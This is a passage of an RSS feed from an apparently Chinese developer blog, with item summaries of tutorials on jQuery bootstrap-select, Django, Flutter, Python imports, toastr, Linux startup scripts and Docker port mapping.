value=&amp;#34;4&amp;#34;&amp;gt;湖南省&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;5&amp;#34;&amp;gt;山东省&amp;lt;/option&amp;gt; &amp;lt;/select&amp;gt; 3.取值 关于组件取值保持原生的jquery方法，比如 var value = $(&#39;#sel&#39;).val(); ，需要注意的是，如果是多选，这里得到的value变量是一个数组变量，形如 [&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]
4.赋值 组件赋值就需要稍微变换一下了，如果你直接 $(&#39;#sel&#39;).val(&#39;1&#39;); 这样赋值将会无效，正确的赋值方法为：
$(&amp;#39;.selectpicker&amp;#39;).selectpicker(&amp;#39;val&amp;#39;, &amp;#39;1&amp;#39;); 注意，赋值的值为option的value属性！！
在一些级联选择的使用场景中，经常需要在赋值的时候顺便触发一下组件的change事件，我们可以这么做。
$(&amp;#39;.selectpicker&amp;#39;).selectpicker(&amp;#39;val&amp;#39;, &amp;#39;1&amp;#39;).trigger(&amp;#34;change&amp;#34;); 如果是多选的赋值，也是一样
$(&amp;#39;.selectpicker&amp;#39;).selectpicker(&amp;#39;val&amp;#39;, [&amp;#39;1&amp;#39;,&amp;#39;2&amp;#39;,&amp;#39;3&amp;#39;]).trigger(&amp;#34;change&amp;#34;); 恢复原状 $(&amp;#39;#initializePartyAProject&amp;#39;).on(&amp;#39;click&amp;#39;, function () { //回到初始状态  $(&amp;#39;#party_a_project_name&amp;#39;).selectpicker(&amp;#39;val&amp;#39;,[&amp;#39;noneSelectedText&amp;#39;]) //对party_a_project_name这个下拉框进行重置刷新  $(&amp;#34;#party_a_project_name&amp;#34;).selectpicker(&amp;#39;refresh&amp;#39;); }); </description>
    </item>
    
    <item>
      <title>Django(5)——接口开发</title>
      <link>https://ac-lm.github.io/posts/django/django5%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91/</link>
      <pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django5%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%8F%91/</guid>
      <description>1.在项目文件下 urls.py 添加接口根路径: # api path(&amp;#39;api/&amp;#39;,include(&amp;#39;django_web.urls&amp;#39;)), # url(r&amp;#39;^api/&amp;#39;,include((&amp;#39;django_web.urls&amp;#39;,&amp;#39;django_web&amp;#39;),namespace=&amp;#39;django_web&amp;#39;)), 2.在 app 应用 django_web 下新建 urls.py 添加具体接口： from django.urls import path from django_web.views import views_api # 在 django_web 下创建 urls.py，配置具体接口的二级目录 urlpatterns = [ # guest system interface: # ex : /api/add_event/ path(&amp;#39;add_event/&amp;#39;,views_api.add_event,name=&amp;#39;add_event&amp;#39;), # ex : /api/get_event_list/ path(&amp;#39;get_event_list/&amp;#39;,views_api.get_event_list,name=&amp;#39;get_event_list&amp;#39;), # ex: /api/add_guest/ path(&amp;#39;add_guest/&amp;#39;,views_api.add_guest,name=&amp;#39;add_guest&amp;#39;), # ex: /api/get_guest_list/ path(&amp;#39;get_guest_list/&amp;#39;,views_api.get_guest_list,name=&amp;#39;get_guest_list&amp;#39;), # ex: /api/user_sign/ path(&amp;#39;user_sign/&amp;#39;,views_api.user_sign,name=&amp;#39;user_sign&amp;#39;), ] 3.在创建接口视图函数 view_api.py 文件，实现具体接口： from django_web.models import Event, Guest from django.http import JsonResponse from django.</description>
    </item>
    
    <item>
      <title>Flutter(20)——读取手机文件路径</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter20%E8%AF%BB%E5%8F%96%E6%89%8B%E6%9C%BA%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</link>
      <pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter20%E8%AF%BB%E5%8F%96%E6%89%8B%E6%9C%BA%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/</guid>
      <description>参考原文： 【Flutter 实战】文件系统目录 @老孟程序员 
 1.添加依赖 在项目的 pubspec.yaml 文件中添加依赖：
dependencies: path_provider: ^1.6.14 执行命令：
flutter pub get 2.获取文件路径   getTemporaryDirectory
临时目录，适用于下载的缓存文件，此目录随时可以清除，此目录为应用程序私有目录，其他应用程序无法访问此目录。
  getApplicationSupportDirectory
应用程序可以在其中放置应用程序支持文件的目录的路径。
  getLibraryDirectory
应用程序可以在其中存储持久性文件，备份文件以及对用户不可见的文件的目录路径，例如storage.sqlite.db。
  getApplicationDocumentsDirectory
应用程序可能在其中放置用户生成的数据或应用程序无法重新创建的数据的目录路径。
  getExternalStorageDirectory
应用程序可以访问顶级存储的目录的路径。由于此功能仅在Android上可用，因此应在发出此函数调用之前确定当前操作系统。
  getExternalCacheDirectories
存储特定于应用程序的外部缓存数据的目录的路径。 这些路径通常位于外部存储（如单独的分区或SD卡）上。 电话可能具有多个可用的存储目录。
  getExternalStorageDirectories
可以存储应用程序特定数据的目录的路径。 这些路径通常位于外部存储（如单独的分区或SD卡）上。
  getDownloadsDirectory
存储下载文件的目录的路径，这通常仅与台式机操作系统有关。
  3.Android 文件存储 Android 文件存储分为内部存储和外部存储。
a.内部存储 用于保存应用的私有文件，其他应用无法访问这些数据，创建的文件在此应用的包名目录下，没有 root 权限 的手机无法在手机的 文件管理 应用中看到此目录，不过可以通过 Android Studio 工具查看，路径为：data/data/包名。包名下具体的目录结构为：</description>
    </item>
    
    <item>
      <title>Web开发(8)——定位点击位置</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%918%E5%AE%9A%E4%BD%8D%E7%82%B9%E5%87%BB%E4%BD%8D%E7%BD%AE/</link>
      <pubDate>Sat, 05 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%918%E5%AE%9A%E4%BD%8D%E7%82%B9%E5%87%BB%E4%BD%8D%E7%BD%AE/</guid>
      <description>1.实现代码 $(&amp;#39;body&amp;#39;).click(function(e) { // 在页面任意位置点击而触发此事件  // e.target表示被点击的目标  if($(e.target).attr(&amp;#34;id&amp;#34;) == &amp;#39;btn_my_mesg&amp;#39;){ //要隐藏或显示的元素  $(&amp;#34;.myMsgs&amp;#34;).css(&amp;#34;display&amp;#34;,&amp;#34;block&amp;#34;); }else{ $(&amp;#34;.myMsgs&amp;#34;).css(&amp;#34;display&amp;#34;,&amp;#34;none&amp;#34;); } }) </description>
    </item>
    
    <item>
      <title>Django(4)——cookie处理</title>
      <link>https://ac-lm.github.io/posts/django/django4cookie-%E5%A4%84%E7%90%86/</link>
      <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django4cookie-%E5%A4%84%E7%90%86/</guid>
      <description>1.设置 cookie # 编写视图函数，进行设置 from datetime import datetime,timedelta def set_cookie(request): &amp;#34;&amp;#34;&amp;#34;设置cookie&amp;#34;&amp;#34;&amp;#34; response = HttpResponse(&amp;#34;设置cookie&amp;#34;) &amp;#39;&amp;#39;&amp;#39; max_age 设置过期时间，单位是秒 &amp;#39;&amp;#39;&amp;#39; # response.set_cookie(&amp;#39;name&amp;#39;, &amp;#39;tong&amp;#39;, max_age=14 * 24 * 3600) &amp;#39;&amp;#39;&amp;#39; expires 设置过期时间，是从现在的时间开始到那个时间结束 &amp;#39;&amp;#39;&amp;#39; response.set_cookie(&amp;#39;name&amp;#39;, &amp;#39;tong&amp;#39;, expires=datetime.now()+timedelta(days=14)) return response 2.获取cookie # 视图函数中定义 get_cookie 方法 def get_cookie(request): &amp;#34;&amp;#34;&amp;#34;获取cookie&amp;#34;&amp;#34;&amp;#34; name = request.COOKIES[&amp;#39;name&amp;#39;] return HttpResponse(name) </description>
    </item>
    
    <item>
      <title>Flutter(19)——时间</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter19%E6%97%B6%E9%97%B4/</link>
      <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter19%E6%97%B6%E9%97%B4/</guid>
      <description>1.时间 var today = DateTime.now(); print(&amp;#39;当前时间是：$today&amp;#39;); var date1 = today.millisecondsSinceEpoch; print(&amp;#39;当前时间戳：$date1&amp;#39;); var date2 = DateTime.fromMillisecondsSinceEpoch(date1); print(&amp;#39;时间戳转日期：$date2&amp;#39;); // 拼接成 date var dentistAppointment = new DateTime(2019, 6, 20, 17, 30,20); print(dentistAppointment); // 字符串转 date DateTime date3 = DateTime.parse(&amp;#34;2019-06-20 15:32:41&amp;#34;); print(date3); // 时间比较 print(today.isBefore(date3));// 在之前 print(today.isAfter(date3)); // 在之后 print(date3.isAtSameMomentAs(date3));// 相同 print(date3.compareTo(today));// 大于返回1；等于返回0；小于返回-1  // 时间增加 var fiftyDaysFromNow = today.add(new Duration(days: 5)); print(&amp;#39;today加5天：$fiftyDaysFromNow&amp;#39;); // 时间减少 DateTime fiftyDaysAgo = today.subtract(new Duration(days: 5)); print(&amp;#39;today减5天：$fiftyDaysAgo&amp;#39;); // 时间差，两个时间相差，小时数 print(&amp;#39;比较两个时间差，小时数：${fiftyDaysFromNow.</description>
    </item>
    
    <item>
      <title>Python(30)——import</title>
      <link>https://ac-lm.github.io/posts/python/python30import/</link>
      <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python30import/</guid>
      <description>参考：Python中import的用法 @门书生  &amp;amp; 聊聊Python Import System？@没有50CM手臂 
 A.基本概念 1. 什么可以被 import? 因为 Python 中一切都是对象，都属于 object，所以任何东西都可以被 import，在这些不同的对象中，我们经常使用到的结构是模块Module 和包 Package。它们在 Python 的底层都是以 PyModuleObject 的结构体实例存在的，类型为 PyModule_Type，而在 Python 中则表现为一个对象 &amp;lt;class &#39;module&#39;&amp;gt; 。
1.1 模块（Module） Python 中，不管是对常见的.py文件，或是编译优化的.pyc，.pyo文件、扩展类型的.pyd，.pyw文件来说， 它们是属于 Python 代码载体的最小单元，这样单独存在的文件我们都称之为模块。
1.2 包（Package） 上述这样的多个模块组合在一起，我们就称之为包。通常来说，创建包的步骤都是这样的：首先新建一个目录，然后新建__init__.py，最后再编写模块。这种包被称为 Regular packages。
2. import 的方式 ？ 绝对导入与相对导入 2.1 绝对导入 绝对路径要求我们必须从最顶层的文件夹开始，为每个包或每个模块提供出完整详细的导入路径
from package1 import mudule1 from package1.module2 import Fx from package2 import Cx from package2.subpackage1.module5 import Fy 2.2 相对导入 相对导入则要求我们给出相对与当前位置，想导入资源所在的位置。另外，相对导入又分为隐式相对导入和显式相对导入两种，比如我们想在package2/module3.py中引用module4模块，我们可以这么写</description>
    </item>
    
    <item>
      <title>Web开发(7)——Jquery 消息提示插件 toastr</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%917jquery-%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E6%8F%92%E4%BB%B6-toastr/</link>
      <pubDate>Fri, 04 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%917jquery-%E6%B6%88%E6%81%AF%E6%8F%90%E7%A4%BA%E6%8F%92%E4%BB%B6-toastr/</guid>
      <description> 参考文献： github-toastr @CodeSeven 
 toastr是一个基于jQuery简单、漂亮的消息提示插件，使用简单、方便，可以设置超时时间自动消失。
1.引入toastr的js、css文件 &amp;lt;script src=&amp;#34;&amp;lt;%=path%&amp;gt;/res/toastr/toastr.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;&amp;lt;%=path%&amp;gt;/res/toastr/toastr.min.css&amp;#34;&amp;gt; 2.使用 //常规消息提示，默认背景为浅蓝色 toastr.info(&amp;#34;你有新消息了!&amp;#34;); //成功消息提示，默认背景为浅绿色 toastr.success(&amp;#34;你有新消息了!&amp;#34;); //警告消息提示，默认背景为橘黄色 toastr.warning(&amp;#34;你有新消息了!&amp;#34;); //错误消息提示，默认背景为浅红色 toastr.error(&amp;#34;你有新消息了!&amp;#34;); //带标题的消息框 toastr.success(&amp;#34;你有新消息了!&amp;#34;,&amp;#34;消息提示&amp;#34;); //另一种调用方法 toastr[&amp;#34;info&amp;#34;](&amp;#34;你有新消息了!&amp;#34;,&amp;#34;消息提示&amp;#34;); 3.自定义参数 toastr.options = { closeButton: false, debug: false, progressBar: true, positionClass: &amp;#34;toast-bottom-center&amp;#34;, onclick: null, showDuration: &amp;#34;300&amp;#34;, hideDuration: &amp;#34;1000&amp;#34;, timeOut: &amp;#34;2000&amp;#34;, extendedTimeOut: &amp;#34;1000&amp;#34;, showEasing: &amp;#34;swing&amp;#34;, hideEasing: &amp;#34;linear&amp;#34;, showMethod: &amp;#34;fadeIn&amp;#34;, hideMethod: &amp;#34;fadeOut&amp;#34; }; 4.参数说明 closeButton：false，是否显示关闭按钮（提示框右上角关闭按钮）； debug：false，是否为调试； progressBar：false，是否显示进度条（设置关闭的超时时间进度条）； positionClass，消息框在页面显示的位置 toast-top-left 顶端左边 toast-top-right 顶端右边 toast-top-center 顶端中间 toast-top-full-width 顶端，宽度铺满整个屏幕 toast-botton-right toast-bottom-left toast-bottom-center toast-bottom-full-width onclick，点击消息框自定义事件 showDuration: “300”，显示动作时间 hideDuration: “1000”，隐藏动作时间 timeOut: “2000”，自动关闭超时时间 extendedTimeOut: “1000” showEasing: “swing”, hideEasing: “linear”, showMethod: “fadeIn” 显示的方式，和jquery相同 hideMethod: “fadeOut” 隐藏的方式，和jquery相同 </description>
    </item>
    
    <item>
      <title>Django(3)——设置当前时间</title>
      <link>https://ac-lm.github.io/posts/django/django3%E8%AE%BE%E7%BD%AE%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4/</link>
      <pubDate>Thu, 03 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django3%E8%AE%BE%E7%BD%AE%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4/</guid>
      <description>1.时间字段 在 model 中，有 DateTimeField、DateField 和 TimeField 三种类型可以用来创建日期字段，其值分别对应着 datetime()、date()、time() 三种对象。
2.属性 DateTimeField.auto_now 这个参数的默认值为 false，设置为 true 时，能够在保存该字段时，将其值设置为当前时间，并且每次修改 model，都会自动更新。因此这个参数在需要存储“最后修改时间”的场景下，十分方便。需要注意的是，设置该参数为 true 时，并不简单地意味着字段的默认值为当前时间，而是指字段会被“强制”更新到当前时间，你无法程序中手动为字段赋值；如果使用 django 再带的 admin 管理器，那么该字段在 admin 中是只读的。
DateTimeField.auto_now_add 这个参数的默认值也为 false，设置为 true 时，会在 model 对象第一次被创建时，将字段的值设置为创建时的时间，以后修改对象时，字段的值不会再更新。该属性通常被用在存储“创建时间”的场景下。与 auto_now 类似，auto_now_add 也具有强制性，一旦被设置为 true，就无法在程序中手动为字段赋值，在 admin 中字段也会成为只读的。
3.如何将创建时间设置为“默认当前”并且可修改 那么问题来了。实际场景中，往往既希望在对象的创建时间默认被设置为当前值，又希望能在日后修改它。怎么实现这种需求呢？
django 中所有的 model 字段都拥有一个 default 参数，用来给字段设置默认值。可以用 default=timezone.now 来替换 auto_now=True 或 auto_now_add=True。timezone.now 对应着 django.utils.timezone.now()，因此需要写成类似下面的形式：
from django.db import models import django.utils.timezone as timezone class Doc(models.Model): add_date = models.DateTimeField(&amp;#39;保存日期&amp;#39;,default = timezone.now) mod_date = models.</description>
    </item>
    
    <item>
      <title>Python(29)——__init__ 文件</title>
      <link>https://ac-lm.github.io/posts/python/python29__init__-%E6%96%87%E4%BB%B6/</link>
      <pubDate>Thu, 03 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python29__init__-%E6%96%87%E4%BB%B6/</guid>
      <description>1.作用  标识该目录是一个 python 的模块包（module package）。 初始化导入操作，当使用 import 导入该目录时，会执行 __init__.py 里面的代码。  在__init__.py 里面加一个 print(&amp;quot;You have imported mypackage&amp;quot;)，如果执行了该文件就会输出，很显然，__init__.py 会在包被导入时执行。
# 文件构造 └── mypackage ├── __init__.py ├── subpackage_1 │ ├── test11.py │ └── test12.py ├── subpackage_2 │ ├── test21.py │ └── test22.py └── subpackage_3 ├── test31.py └── test32.py &amp;gt;&amp;gt;&amp;gt; import mypackage You have imported mypackage 2.from &amp;hellip;.. import * 这里使用到了__all__变量，__all__关联了一个模块列表，当执行 from &amp;hellip;.. import * 时，就会导入列表中的模块。可以将 __init__.py 增加一个__all__变量。
__all__ = [&amp;#39;subpackage_1&amp;#39;, &amp;#39;subpackage_2&amp;#39;] &amp;gt;&amp;gt;&amp;gt; from mypackage import * &amp;gt;&amp;gt;&amp;gt; dir() [&amp;#39;__builtins__&amp;#39;, &amp;#39;__doc__&amp;#39;, &amp;#39;__loader__&amp;#39;, &amp;#39;__name__&amp;#39;, &amp;#39;__package__&amp;#39;, &amp;#39;__spec__&amp;#39;, &amp;#39;subpackage_1&amp;#39;, &amp;#39;subpackage_2&amp;#39;] &amp;gt;&amp;gt;&amp;gt; &amp;gt;&amp;gt;&amp;gt; dir(subpackage_1) [&amp;#39;__doc__&amp;#39;, &amp;#39;__loader__&amp;#39;, &amp;#39;__name__&amp;#39;, &amp;#39;__package__&amp;#39;, &amp;#39;__path__&amp;#39;, &amp;#39;__spec__&amp;#39;] 显然导入了__all__变量的内容，但需要注意的是，此时子目录的中的模块没有导入，即不会导入test*等文件。</description>
    </item>
    
    <item>
      <title>Web开发(6)——常用小知识</title>
      <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%916%E5%B8%B8%E7%94%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/</link>
      <pubDate>Thu, 03 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%916%E5%B8%B8%E7%94%A8%E5%B0%8F%E7%9F%A5%E8%AF%86/</guid>
      <description>1.屏蔽链接 href=&amp;#34;javascript:void(0);&amp;#34; &amp;lt;script&amp;gt;window.alert(&amp;#34;sometext&amp;#34;)&amp;lt;/script&amp;gt; 2.min文件 min，Minimized的缩写，是压缩后的js或css文件。里面的功能与没有min的文件是一样的。
js或css文件一般都是从服务器上下载到本地浏览器上解释执行的，如果js文件过大，这样必然会导致网页加载速度变慢。所以，有了压缩js文件的做法。
实际压缩原理很简单，就是把原来js文件中的空格，回车符，注释全部清除。因此这种js文件通常是不可读的，因为压缩后，文件是一行写到尾。
3.li标签间的间隔删除 li标签间的间隔是由于：行框的排列会受到中间空白（回车\空格）等的影响，因为空格也属于字符，这些空白也会被应用样式，占据空间，所以会有间隔。可以将闭合标签写到开头
&amp;lt;li&amp;gt;BAT &amp;lt;/li&amp;gt;&amp;lt;li&amp;gt;BAT&amp;lt;/li&amp;gt; 也可以通过设置 li 标签的 font-size 为 0，解决该问题。
4.CSS样式覆盖  规则一：由于继承而发生样式冲突时，最近祖先/父元素获胜（最近原则） 规则二：继承的样式和直接指定的样式冲突时，直接指定的样式获胜（最直接原则） 规则三：直接指定的样式发生冲突时，样式权值高者获胜。内联样式的权值&amp;raquo;ID选择器&amp;raquo;类选择器&amp;raquo;标签选择器 规则四：样式权值相同时，后者获胜。注意样式表的出现位置 规则五：!important的样式属性不被覆盖  5.页面跳转 window.location.replace(&amp;#34;网址&amp;#34;); window.location.href = &amp;#34;网址&amp;#34;; $(location).attr(&amp;#39;href&amp;#39;, ‘网址’); $(window).attr(&amp;#39;location&amp;#39;,‘网址’); $(location).prop(&amp;#39;href&amp;#39;,‘网址’) 6.js将html字符串转换成node节点 innerHTML function createNode(txt) { const template = `&amp;lt;div class=&amp;#39;child&amp;#39;&amp;gt;${txt}&amp;lt;/div&amp;gt;`; let tempNode = document.createElement(&amp;#39;div&amp;#39;); tempNode.innerHTML = template; return tempNode.firstChild; } const container = document.getElementById(&amp;#39;container&amp;#39;); container.appendChild(createNode(&amp;#39;hello&amp;#39;)); DOMParser function createDocument(txt) { const template = `&amp;lt;div class=&amp;#39;child&amp;#39;&amp;gt;${txt}&amp;lt;/div&amp;gt;`; let doc = new DOMParser().</description>
    </item>
    
    <item>
      <title>Django(2)——HTML 模板</title>
      <link>https://ac-lm.github.io/posts/django/django2html-%E6%A8%A1%E6%9D%BF/</link>
      <pubDate>Wed, 02 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django2html-%E6%A8%A1%E6%9D%BF/</guid>
      <description>1.遍历字典 在模版中要遍历字典 dict ，一般使用如下代码实现
{% for key,value in param.items %} {{ key }} {{ value }} {% endfor %} </description>
    </item>
    
    <item>
      <title>Django(1)——Models</title>
      <link>https://ac-lm.github.io/posts/django/django1models/</link>
      <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/django/django1models/</guid>
      <description>1.模型的基本概念 Django 中每个模型都是一个 Python 类，这些类继承自 django.db.models.Model。模型类的每个属性都相当于一个数据库的字段。
from django.db import models class Person(models.Model): first_name = models.CharField(max_length=30) last_name = models.CharField(max_length=30) 上述代码相当于使用数据库语言创建一个 Person 表单，有两个字段 first_name 与 last_name
CREATE TABLE myapp_person ( &amp;#34;id&amp;#34; serial NOT NULL PRIMARY KEY, &amp;#34;first_name&amp;#34; varchar(30) NOT NULL, &amp;#34;last_name&amp;#34; varchar(30) NOT NULL ); 2.使用模型 在定义模型后，你需要告诉 Django 将使用这些模型。通过编辑你的设置文件 setting.py，改变 INSTALLED_APPS 设置来添加包含你 models.py 的模块的名称来实现这一点。
INSTALLED_APPS = [ #... &amp;#39;myapp&amp;#39;, # 模块名 #... ] 3.字段 a.字段类型 略
b.字段选项  max_length：该参数指定用于存储数据的 VARCHAR 数据库字段的大小。 null：如果是 True，Django 会将空置的值存储为 NULL。默认是 False。 blank ：如果是 True，这个字段是空白的。默认是 False。注意，这与 null 不同的是，null 与数据库相关，而 blank 则是与验证相关的。如果一个字段有 blank=True ，表单验证就允许输入空值。如果一个字段有 blank=False ，则需要字段。 choices：2元组的可迭代，例如，列表或元组的元素选择。 default：字段的默认值。 unique：如果是真的，这个字段必须在整个表中是唯一的。 related_nam：使用外键时调用的名字。  c.</description>
    </item>
    
    <item>
      <title>Linux(21)——设置开机启动任务</title>
      <link>https://ac-lm.github.io/posts/linux/linux21%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1/</link>
      <pubDate>Tue, 01 Jun 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux21%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1/</guid>
      <description>参考原文：Linux 添加开机启动方法(服务/脚本) @jb51 
 1.系统启动文件 系统启动时按顺序加载以下的配置文件，要设置开机启动任务即修改以下部分文件
/etc/profile、/root/.bash_profile/etc/bashrc、/root/.bashrc/etc/profile.d/*.sh、/etc/profile.d/lang.sh/etc/sysconfig/i18n、/etc/rc.local（/etc/rc.d/rc.local）2.修改开机启动文件：/etc/rc.local（或者/etc/rc.d/rc.local） # 1.编辑rc.local文件[root@localhost ~]# vi /etc/rc.local# 2.修改rc.local文件，在 exit 0 前面加入以下命令。保存并退出。/etc/init.d/mysqld start # mysql开机启动/etc/init.d/nginx start # nginx开机启动supervisord -c /etc/supervisor/supervisord.conf # supervisord开机启动/bin/bash /server/scripts/test.sh &amp;gt;/dev/null 2&amp;gt;/dev/null# 3.最后修改rc.local文件的执行权限[root@localhost ~]# chmod +x /etc/rc.local[root@localhost ~]# chmod 755 /etc/rc.local3.shell脚本的启动 将写好的脚本（.sh文件）放到目录 /etc/profile.d/ 下，系统启动后就会自动执行该目录下的所有shell脚本。
4.通过chkconfig命令设置 # 1.将(脚本)启动文件移动到 /etc/init.d/ 或者 /etc/rc.d/init.d/ 目录下。（前者是后者的软连接）mv /www/wwwroot/test.sh /etc/rc.d/init.d# 2.启动文件前面务必添加如下三行代码，否侧会提示chkconfig不支持。#!/bin/sh 告诉系统使用的shell,所以的shell脚本都是这样#chkconfig: 35 20 80 分别代表运行级别，启动优先权，关闭优先权，此行代码必须#description: http server 自己随便发挥！！！，此行代码必须/bin/echo $(/bin/date +%F_%T) &amp;gt;&amp;gt; /tmp/test.</description>
    </item>
    
    <item>
      <title>Linux(20)——通过配置文件修改 docker 容器端口映射</title>
      <link>https://ac-lm.github.io/posts/linux/linux20%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9-docker-%E5%AE%B9%E5%99%A8%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/</link>
      <pubDate>Mon, 31 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux20%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BF%AE%E6%94%B9-docker-%E5%AE%B9%E5%99%A8%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/</guid>
      <description>1.找到docker的配置文件 使用 docker ps -a 命令找到要修改容器的 CONTAINER ID
运行 docker inspect 【CONTAINER ID】 | grep Id 命令，根据容器ID找到文件ID
执行 cd /var/lib/docker/containers 命令进入 docker 容器文件夹，找到与 文件ID 相同的目录
2.修改docker的配置文件 停止 docker 引擎服务，systemctl stop docker 或者 service docker stop
进入对应 文件ID 所在目录，修改 hostconfig.json 两个文件
把 8080 映照到 80，重启服务 systemctl start docker
【PS】或修改 vi config.v2.json，找到 ExposedPorts 和 Ports 对应项，还是仿照原先的内容添加自己所需要的端口映射</description>
    </item>
    
    <item>
      <title>Flutter(18)——内置对话框</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter18%E5%86%85%E7%BD%AE%E5%AF%B9%E8%AF%9D%E6%A1%86/</link>
      <pubDate>Wed, 19 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter18%E5%86%85%E7%BD%AE%E5%AF%B9%E8%AF%9D%E6%A1%86/</guid>
      <description>参考原文：Flutter内置show @老孟Flutter 
 1.showDialog showDialog 用于弹出普通 Material 风格的对话框，用法如下：
showDialog( context: context, builder: (context) { return AlertDialog( ... ); } ); 2.showCupertinoDialog showCupertinoDialog 用于弹出 ios 风格对话框，基本用法如下：
showCupertinoDialog( context: context, builder: (context) { return CupertinoAlertDialog( ... ); }); 3.showAboutDialog AboutDialog 用于描述当前 App 信息，底部提供 2 个按钮：查看许可按钮和关闭按钮。AboutDialog 需要和 showAboutDialog 配合使用，用法如下：
showAboutDialog( context: context, applicationIcon: Image.asset( &amp;#39;images/bird.png&amp;#39;, height: 100, width: 100, ), applicationName: &amp;#39;应用程序&amp;#39;, applicationVersion: &amp;#39;1.0.0&amp;#39;, applicationLegalese: &amp;#39;copyright 老孟，一枚有态度的程序员&amp;#39;, children: &amp;lt;Widget&amp;gt;[ Container( height: 30, color: Colors.</description>
    </item>
    
    <item>
      <title>Flutter(17)——CupertinoPicker 滚轮选择器</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter17cupertinopicker-%E6%BB%9A%E8%BD%AE%E9%80%89%E6%8B%A9%E5%99%A8/</link>
      <pubDate>Tue, 18 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter17cupertinopicker-%E6%BB%9A%E8%BD%AE%E9%80%89%E6%8B%A9%E5%99%A8/</guid>
      <description>1.组件使用 Container( height: 120, width: 100, child: CupertinoPicker( itemExtent: 27, onSelectedItemChanged: (position) {}, children: [ Text(&amp;#34;192&amp;#34;) ] ),), </description>
    </item>
    
    <item>
      <title>Flutter(16)——Fluttertoast 插件弹出提示</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter16fluttertoast-%E6%8F%92%E4%BB%B6%E5%BC%B9%E5%87%BA%E6%8F%90%E7%A4%BA/</link>
      <pubDate>Mon, 17 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter16fluttertoast-%E6%8F%92%E4%BB%B6%E5%BC%B9%E5%87%BA%E6%8F%90%E7%A4%BA/</guid>
      <description>1.引入插件 在 pubspec.yaml 中添加依赖:
fluttertoast: ^4.0.1 2.使用 import &amp;#39;package:fluttertoast/fluttertoast.dart&amp;#39;; RaisedButton( child: Text(&amp;#34;弹出toast&amp;#34;), onPressed: () { Fluttertoast.showToast( msg: &amp;#34;你今天真好看&amp;#34;, toastLength: Toast.LENGTH_SHORT, gravity: ToastGravity.BOTTOM, timeInSecForIosWeb: 1, backgroundColor: Colors.black45, textColor: Colors.white, fontSize: 16.0); }, ) </description>
    </item>
    
    <item>
      <title>Flutter(15)——Row 子控件两端对齐</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter15row-%E5%AD%90%E6%8E%A7%E4%BB%B6%E4%B8%A4%E7%AB%AF%E5%AF%B9%E9%BD%90/</link>
      <pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter15row-%E5%AD%90%E6%8E%A7%E4%BB%B6%E4%B8%A4%E7%AB%AF%E5%AF%B9%E9%BD%90/</guid>
